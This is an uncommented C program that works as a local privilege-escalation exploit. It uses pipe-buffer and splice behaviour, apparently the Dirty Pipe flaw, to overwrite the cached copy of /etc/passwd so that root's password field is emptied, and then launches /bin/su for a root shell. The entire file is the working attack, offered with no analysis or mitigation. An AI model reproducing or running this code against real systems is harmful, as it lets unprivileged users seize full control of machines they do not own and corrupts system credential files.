#define	_GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define	PAGESIZE 4096
#define	PIPEPAGENUM	16

int
	main()
{
	int	fd = open( "/etc/passwd", O_RDONLY );
	size_t	offset = 5;
	char	*data = ":0:0:rootx";

	int	p[2];
	pipe( p );

	char	buffer[PAGESIZE];
	for( int i = 0; i < PIPEPAGENUM; i++ ) write( p[1], buffer, PAGESIZE );
	for( int i = 0; i < PIPEPAGENUM; i++ ) read( p[0], buffer, PAGESIZE );

	offset--;
	splice( fd, &offset, p[1], NULL, 1, 0 );

	write( p[1], data, strlen( data ) );
	execl( "/bin/su", "/bin/su", "-", NULL );
}
